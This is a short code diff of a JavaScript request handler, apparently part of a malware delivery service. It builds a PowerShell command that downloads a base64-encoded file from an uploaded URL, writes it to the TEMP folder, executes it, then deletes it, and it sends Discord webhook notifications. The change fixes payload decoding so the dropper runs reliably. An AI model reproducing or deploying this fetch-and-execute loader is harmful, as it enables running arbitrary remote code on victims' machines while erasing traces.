@@ -55,7 +55,7 @@ const handler = async (req, res) => {
       discordReq.end();
     });
 
-    const cmd = `powershell -c "$t=\\"$env:TEMP\\${file.filename}\\";$u='${uploadedUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
+    const cmd = `powershell -c "$t=\\"$env:TEMP\\${file.filename}\\";$u='${uploadedUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u).Trim().Trim('\\"')));Start-Process $t -Wait;Remove-Item $t"`;
 
     // Notification
     const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
